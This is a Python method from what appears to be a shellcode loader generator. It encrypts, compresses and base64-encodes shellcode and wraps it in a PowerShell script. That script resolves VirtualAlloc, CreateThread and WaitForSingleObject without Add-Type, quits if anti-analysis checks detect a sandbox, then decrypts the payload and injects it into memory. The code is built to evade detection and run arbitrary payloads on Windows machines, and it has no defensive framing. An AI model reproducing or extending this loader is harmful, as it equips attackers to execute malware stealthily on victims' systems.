    def build(self) -> str:
        compressed = self._compress(self.sc)
        xor_key = self._xor_key()
        encrypted = self._encrypt(compressed, xor_key)
        payload_b64 = self._base64_encode(encrypted)

        sc_b64_var = self._rand_var("b64payload")
        sc_raw_var = self._rand_var("raw")

        script = self._header()
        
        if self.opts.get("debug_mode", False):
            script += "\nWrite-Host '[*] Initializing runner operations...'\n"
            script += "Write-Host '[*] Launching dynamic API resolving mechanisms...'\n"

        script += self._winapi_no_addtype()

        if self.opts.get("debug_mode", False):
            script += f"Write-Host '[+] DLL Export parsing completed! Loaded Addresses:'\n"
            script += f"Write-Host '    VirtualAlloc -> 0x' ${self.va_ptr_var}.ToString('X')\n"
            script += f"Write-Host '    CreateThread -> 0x' ${self.ct_ptr_var}.ToString('X')\n"
            script += f"Write-Host '    WaitForSingleObject -> 0x' ${self.wso_ptr_var}.ToString('X')\n"

        anti = self._anti_analysis()
        if self.opts.get("debug_mode", False):
            script += anti
        else:
            if anti != "$true":
                script += f"\nif (-not ({anti})) {{ exit }}\n"

        script += self._decryptor(xor_key)
        script += self._decompressor()

        script += f"\n${sc_b64_var} = @\"\n{payload_b64}\n\"@\n"
        
        if self.opts.get("debug_mode", False):
            script += "Write-Host '[*] Unpacking compressed and encrypted binary base64 string...'\n"

        script += f"\n${sc_raw_var} = Decompress (Decrypt ([Convert]::FromBase64String(${sc_b64_var})))\n"

        if self.opts.get("debug_mode", False):
            script += f"Write-Host '[+] Extraction completed! Dynamic byte size: ' ${sc_raw_var}.Length 'bytes'\n"

        script += self._injector(sc_raw_var)
        return script


